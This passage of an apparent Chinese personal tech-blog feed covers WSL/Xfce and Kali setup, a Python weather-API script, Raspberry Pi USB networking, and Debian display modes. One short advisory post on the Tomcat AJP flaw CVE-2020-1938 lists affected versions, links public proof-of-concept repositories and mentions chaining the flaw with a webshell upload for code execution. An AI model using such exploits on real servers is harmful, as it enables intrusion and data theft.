        <content type="html"><![CDATA[<blockquote><p>要想在Windows下不使用虚拟机运行Linux，首先需要了解的知识点是到底wsl和xfce是什么东西</p></blockquote><h2 id="什么是wsl"><a href="#什么是wsl" class="headerlink" title="什么是wsl"></a>什么是wsl</h2><p>Windows Subsystem for Linux（简称WSL）是一个在Windows 10上能够运行原生Linux二进制可执行文件（ELF格式）的兼容层。简单点说，也就是Windows下的现有的Linux子系统。<br><img src="http://img.ex1t.xyz/20201230172546.png"></p><h2 id="什么是Xfce"><a href="#什么是Xfce" class="headerlink" title="什么是Xfce"></a>什么是Xfce</h2><p>Xfce是独立的软件组件构成，可根据需要单独使用或者组合在一起提供计算机图形桌面环境的全面功能，它提供轻量级桌面环境。它明显的优点为快速、轻量、界面美观和对用户友好。</p><p>所以，本篇文章将对安装过程进行详细讲述。</p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="预先配置系统设置"><a href="#预先配置系统设置" class="headerlink" title="预先配置系统设置"></a>预先配置系统设置</h3><p>（1）打开子系统功能<br><img src="http://img.ex1t.xyz/20201230172602.png"><br>（2）打开Microsoft store下载ubuntu<br><img src="http://img.ex1t.xyz/20201230172615.png"><br>由于我的电脑打不开应用商店，所以才有的本次操作，勾选这两个才可以打??应用商店。（如果您可以，请忽略此步）</p><p>（3）下载Ubuntu<br><img src="http://img.ex1t.xyz/20201230172630.png"></p><p>下载成功之后启动ubuntu<br>终端中sudo su可以切换到root权限<br><img src="http://img.ex1t.xyz/20201230172653.png"></p><h3 id="配置wsl"><a href="#配置wsl" class="headerlink" title="配置wsl"></a>配置wsl</h3><p>(1)配置源<br>如果没有配置源，使用apt-get命令安装软件时常常会失败<br>编辑配置源vim /etc/apt/sources.list</p><pre class="line-numbers language-list" data-language="list"><code class="language-list">#添加阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后更新源<br>apt-get update<br>apt-get upgrade<br>时间会比较长</p><p>（2）下载xfce<br>apt install xfce4<br>apt install xfce4-session</p><p>安装完之后需要稍微配置一下 export DISPLAY=localhost:0<br>这个只是临时的环境变量配置，每次启动wsl都要配置一下，我们可以将其写到文件中，就不需要每次都重新配置了。<br>echo “export DISPLAY=:0.0”&gt;&gt; ~/.bashrc<br>或者<br>echo “export DISPLAY=localhost:0”&gt;&gt; ~/.bashrc</p><p>（3）启动桌面<br>打开<img src="http://img.ex1t.xyz/20201230172713.png"><br>这里我选的最后一个，然后一路next<br><img src="http://img.ex1t.xyz/20201230172726.png"><br>之后就是什么都没有的灰色界面，不用管，在wsl下输入命令xfce4-session<br>若会出现如下图所示，则表明安装成功<br><img src="http://img.ex1t.xyz/20201230172740.png"></p><p>安装成之后就可以在xfce桌面中进行美化、安装工具等等，相比于VM十分方便快捷。</p><h2 id="借用上述安装方法安装和运行kali-linux"><a href="#借用上述安装方法安装和运行kali-linux" class="headerlink" title="借用上述安装方法安装和运行kali linux"></a>借用上述安装方法安装和运行kali linux</h2><p>由于这又是一个新下载的子系统，所以同样的需要配置源，配置wsl<br>sudo vim /etc/apt/sources.list<br>&gt;这次我添加的是中科大的源<br>deb <a href="https://mirrors.ustc.edu.cn/kali">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="https://mirrors.ustc.edu.cn/kali">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>然后步骤相同，更新源，下载xfce4，最后打开XLaunch 在wsl中输入xfce4-session<br>使得在xfce中可以运行kali linux子系统。<br><img src="http://img.ex1t.xyz/20201230172755.png"><br><img src="http://img.ex1t.xyz/20201230172835.png"><br>如图所示，xfce可以运行任何你所拥有的子系统。</p><p>当然了，在这个桌面里同样可以实现其他在kali上实现的功能，总之，xfce桌面就是又强大又便捷，你值得拥有。<br>?</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2020-10487漏洞利用及POC</title>
      <link href="/2020/02/22/cnvd-2020-10487%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8Apoc/"/>
      <url>/2020/02/22/cnvd-2020-10487%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8Apoc/</url>
      
        <content type="html"><![CDATA[<h3 id="TOMCAT-简介"><a href="#TOMCAT-简介" class="headerlink" title="TOMCAT 简介"></a>TOMCAT 简介</h3><p>Apache Tomcat 是一个免费的开源 Web 应用服务器，在中小型企业和个人开发用户中有着广泛的应用。</p><h3 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h3><p>Apache Tomcat 中会默认开启一个为ajp的服务（默认端口8009），此服务的主要是使用二进制格式来传输可读性文本，换言之就是用来读取文件的。然而此服务中存在一处缺陷导致可以读取<strong>web目录</strong>下的文件，或者进行文件包含。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CNVD-2020-10487<br>CVE-2020-1938</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="http://img.ex1t.xyz/20201230172227.png"></p><h3 id="POC收集"><a href="#POC收集" class="headerlink" title="POC收集"></a>POC收集</h3><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/</a><br><a href="https://github.com/0nise/CVE-2020-1938">https://github.com/0nise/CVE-2020-1938</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>看到有大牛利用文件上传功能上传webshell，配合此漏洞进行rce操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> poc </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在VMware 15下安装kali 2019.4，并进行相关配置配置</title>
      <link href="/2020/02/18/%E5%9C%A8vmware-15%E4%B8%8B%E5%AE%89%E8%A3%85kali-2019-4%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/02/18/%E5%9C%A8vmware-15%E4%B8%8B%E5%AE%89%E8%A3%85kali-2019-4%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在VMware 15下安装kali 2019.4，并进行相关配置，安装vmware-tools、配置国内源、进行更新</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>镜像地址：<a href="http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso">http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso</a></p></li><li><p>虚拟机版本： vmware 15，下载地址：<a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a></p></li><li><p>虚拟机资源配置要求</p><ol><li>硬盘：60G</li><li>内存：大于等于2G</li><li>CPU：2核心，并在硬件中开启VT</li><li>UEFI模式，非传统bios</li></ol></li><li><p>安装过程参考<a href="http://note.youdao.com/noteshare?id=d8f0b81392a79db38c4635c50e4b54a8&amp;sub=E5AAD49F4CA842D8987324FB8523488A">kali 2020.1安装教程</a>和上课视频</p></li></ul><h2 id="KALI安装过程"><a href="#KALI安装过程" class="headerlink" title="KALI安装过程"></a>KALI安装过程</h2><ul><li><p>虚拟机配置部分略，参考上诉内容</p></li><li><p>具体安装过程</p><ol><li><p>选择Start installer进行安装<img src="http://img.ex1t.xyz/20201230170453.png"></p></li><li><p>选择语言<img src="http://img.ex1t.xyz/20201230170520.png" alt="选择语言"></p></li><li><p>选择地区<img src="http://img.ex1t.xyz/20201230170554.png" alt="选择地区"></p></li><li><p>配置键盘<img src="http://img.ex1t.xyz/20201230170619.png"></p></li><li><p>配置主机名，如kali2019<img src="http://img.ex1t.xyz/20201230170756.png"></p></li><li><p>配置域，建议为空<img src="http://img.ex1t.xyz/20201230170814.png"></p></li><li><p>配置密码，建议按照自己的使用习惯配置，或者直接配置成toor方便记忆<img src="http://img.ex1t.xyz/20201230170833.png"></p></li><li><p>磁盘分区，选择（向导-使用整个磁盘）<img src="http://img.ex1t.xyz/20201230170856.png"></p></li><li><p>配置分区，选择（将所有文件放在同一分区中）<img src="http://img.ex1t.xyz/20201230171312.png"><img src="http://img.ex1t.xyz/20201230171356.png"><img src="http://img.ex1t.xyz/20201230171441.png">配置软件包管理器，如果网络不好建议选择否，安装过程中网络断开会造成安装失败<img src="http://img.ex1t.xyz/20201230171504.png"></p></li><li><p>包管理自动配置过程中，如果无法配置成功，此时要进行如下操作，跳过包管理器的配置</p></li><li><p>安装结束重启</p><p><img src="http://img.ex1t.xyz/20201230171552.png"></p></li></ol></li></ul><h2 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h2><ul><li>安装vmware tools<ol><li>拷贝文件VMwareTools-*tar.gz到下载文件夹。<img src="http://img.ex1t.xyz/20201230172019.png"></li><li>在下载文件夹空白处右击–&gt; 在此处打开命令行，使用命令<code>tar -zxvf VMwareTools-*.tar.gz</code>,之后你回在下载文件夹中看到<img src="http://img.ex1t.xyz/20201230172106.png"></li><li>执行如下命令，进入文件夹vmware-tools-distrib，并执行安装程序，之后一路回车到底<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> vmware-tools-distrib./vmware-install.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>看到如下画面安装成功![图片上传中…]</li></ol></li><li>配置apt源<ol><li>使用命令编辑文件 <code>gedit /etc/apt/sources.list</code></li><li>添加如下内容到文件中，<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></li><li>更新软件源并更新软件,通过更新将操作系统软件更新到最新。  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update -y   <span class="token function">apt</span> upgrade -y --fix-missing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>安装并配置完成，可以正常使用，后面根据情况，在配置zsh和oh-my-zsh等。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> Vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3利用API查询天气及地理信息</title>
      <link href="/2020/01/17/python3%E5%88%A9%E7%94%A8api%E6%9F%A5%E8%AF%A2%E5%A4%A9%E6%B0%94%E5%8F%8A%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF/"/>
      <url>/2020/01/17/python3%E5%88%A9%E7%94%A8api%E6%9F%A5%E8%AF%A2%E5%A4%A9%E6%B0%94%E5%8F%8A%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  在学习python的过程中，看到利用api接口的练习，就写了这么一个功能模块，可以通过ip地址/城市名称/城市标识ID/auto_ip等查询天气和地理信息。</p></blockquote><h2 id="API-amp-KEY"><a href="#API-amp-KEY" class="headerlink" title="API&amp;KEY"></a>API&amp;KEY</h2><p>鉴于本次是查询天气状态 并且中国天气网现已没有再提供API接口，所以我找到了和风天气平台，当然你也可以另寻其他API接口，只要注册登录拿到相关的key就可以。</p><p><img src="http://img.ex1t.xyz/20201230165558.png"></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p><img src="http://img.ex1t.xyz/20201230165633.png"></p><h2 id="url中的参数说明"><a href="#url中的参数说明" class="headerlink" title="url中的参数说明"></a>url中的参数说明</h2><p> <strong>weather_type</strong><br> <img src="http://img.ex1t.xyz/20201230165708.png">&gt;<strong>parameters</strong><br> <img src="http://img.ex1t.xyz/20201230165728.png"><br> 其他具体参数（天气相关）说明  <a href="https://dev.heweather.com/docs/api/weather" title="https://dev.heweather.com/docs/api/weather ">https://dev.heweather.com/docs/api/weather </a></p><h2 id="requests获取信息"><a href="#requests获取信息" class="headerlink" title="requests获取信息"></a>requests获取信息</h2><p>使用的是免费版本的url,数据格式是json</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s"</span> \          <span class="token operator">%</span> <span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">,</span> key<span class="token punctuation">)</span> page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 得到json格式数据</span>page <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>page<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># 将str转化为dict类型，方便处理数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个小知识点<br>json.dumps()和json.loads()是json格式处理函数（可以这么理解，json是字符串）</p><ol><li>json.dumps()函数是将一个Python数据类型列表进行json格式的编码（可以这么理解，json.dumps()函数是将字典转化为字符串）</li><li>json.loads()函数是将json格式数据转换为字典（可以这么理解，json.loads()函数是将字符串转化为字典）</li></ol><p>利用这个字典数据提取出相关信息。<br>如：获取经纬度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"经度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"纬度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="实况天气查询"><a href="#实况天气查询" class="headerlink" title="实况天气查询"></a>实况天气查询</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonweather_type <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">,</span> <span class="token string">'forecast'</span><span class="token punctuation">,</span> <span class="token string">'hourly'</span><span class="token punctuation">,</span> <span class="token string">'lifestyle'</span><span class="token punctuation">]</span>  <span class="token comment"># 实况天气,3-10天预报,逐小时预报,生活指数</span><span class="token triple-quoted-string string">"""parameters形式 1. location=CN101010100 （城市ID）2. location=116.40,39.9  （经纬度格式）3. location=北京、 location=北京市、 location=beijing （城市）4. location=朝阳,北京、 location=chaoyang,beijing  (详细地名)5. location=60.194.130.1  （ip）6. location=auto_ip （根据请求自动判断，根据用户的请求获取IP，通过 IP 定位并获取城市数据）"""</span>key <span class="token operator">=</span> <span class="token string">'551bd5df607546dc136ada2ba9f82280'</span>   <span class="token comment"># 这里的key并不真实，我改了一下，想尝试请自行注册</span><span class="token keyword">def</span> <span class="token function">get_weather</span><span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s"</span> \          <span class="token operator">%</span> <span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token comment"># 和风天气平台API</span>    page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment"># print(page.text)</span>    page <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>page<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(page, "\n", type(page))</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"经度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"纬度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> weather_type <span class="token operator">==</span> <span class="token string">'now'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        现在播放%s的实况天气：当前体感温度为%s摄氏度，天气状况%s，%s风向，风力%s级，风速每%s公里/时，相对湿度%%%s，大气压强为%s,能见度%s公里，云量%s        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>parameters<span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'fl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'cond_txt'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_dir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_sc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_spd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hum'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pres'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'vis'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'cloud'</span><span class="token punctuation">]</span>               <span class="token punctuation">)</span>              <span class="token punctuation">)</span>    <span class="token keyword">elif</span> weather_type <span class="token operator">==</span> <span class="token string">'forecast'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">""" wadaxi        """</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_weather<span class="token punctuation">(</span>weather_type<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'北京'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://img.ex1t.xyz/20201230165843.png"><br>主函数中get_weather()的参数可以根据你的需求替换，学会了实况天气查询，想要查询未来天气、生活指数的话相信也难不倒你，你也可以将此代码补充更加完整。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Mac OS 下一根线玩转树莓派 zero w</title>
      <link href="/2020/01/14/%E5%9C%A8-mac-os-%E4%B8%8B%E4%B8%80%E6%A0%B9%E7%BA%BF%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-zero-w/"/>
      <url>/2020/01/14/%E5%9C%A8-mac-os-%E4%B8%8B%E4%B8%80%E6%A0%B9%E7%BA%BF%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-zero-w/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230165431.png"></p><ol><li><p>在树莓派官网下载下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，使用 etcher 刻录到 sd 中<br><img src="http://img.ex1t.xyz/20201230165358.png"><br><img src="http://img.ex1t.xyz/20201230165332.png"></p></li><li><p>刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：<br><code>dtoverlay=dwc2</code></p></li><li><p>打开cmdline.txt文件。找到单词rootwait，在其之后添加：<br><code>modules-load=dwc2,g_ether</code></p></li><li><p>添加一个文件名为ssh到根目录下，内容为空</p></li><li><p>把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。<br><img src="http://img.ex1t.xyz/20201230165244.jpg"></p></li><li><p>Ping 一下raspberrypi.local看是否能通 </p></li><li><p>之后查看 Mac 的共享名称<br> <img src="http://img.ex1t.xyz/20201230165220.jpg"></p></li><li><p>ssh连接raspberrypi.local，默认密码为raspberry <code>ssh pi@raspberrypi.local</code></p></li><li><p>通过 mac 自带的网络共享按照如下方式配置即可让树莓派上网<br><img src="http://img.ex1t.xyz/20201230165205.png"></p></li><li><p>现在试试是不是可以上网了</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian linux的图形界面和文本界面的切换</title>
      <link href="/2020/01/14/debian-linux%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%87%E6%8D%A2/"/>
      <url>/2020/01/14/debian-linux%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%87%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Debian-linux的图形界面和文本界面的切换"><a href="#Debian-linux的图形界面和文本界面的切换" class="headerlink" title="Debian linux的图形界面和文本界面的切换"></a>Debian linux的图形界面和文本界面的切换</h1><p><img src="http://img.ex1t.xyz/20201230164936.png"></p><p>文件修改开机是否图形配置：</p><ol><li><p>配置图行界面的文件是 vi /etc/default/grub<br>找到：<code>GRUB_CMDLINE_LINUX_DEFAULT="quiet"</code>。<br>复制本行然后把quiet替换成text。<br>把本行注释掉（以免以后想改回来时不知道怎么改回来）。<br>保存后 执行sudo update-grub命令后 重启即可</p></li><li><p>如果想kali每次启动是文本模式可以修改如下文件：<br><code>vi /etc/X11/default-display-manager</code><br>把里面内容/usr/sbin/gdm3改为false之后重启会以文本模式登录，想改回图形就把false还原回/usr/sbin/gdm3</p></li><li><p>快捷键切换（推荐）：ctrl+alt+F1文本模式ctrl+alt+F7图形界面</p></li></ol><h1 id="Kali-图形界面和字符界面切换"><a href="#Kali-图形界面和字符界面切换" class="headerlink" title="Kali 图形界面和字符界面切换"></a>Kali 图形界面和字符界面切换</h1><blockquote><p>Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。</p></blockquote><ul><li><p>切换至字符界面：<br><code>sudo systemctl set-default multi-user.target</code></p></li><li><p>切换至图形界面：<br><code>sudo systemctlset-default graphical.target</code></p></li><li><p>打开图形界面：<br><code>sudo init 5</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习-网络基础部分</title>
      <link href="/2020/01/10/%E5%A4%8D%E4%B9%A0-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/"/>
      <url>/2020/01/10/%E5%A4%8D%E4%B9%A0-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/</url>
      
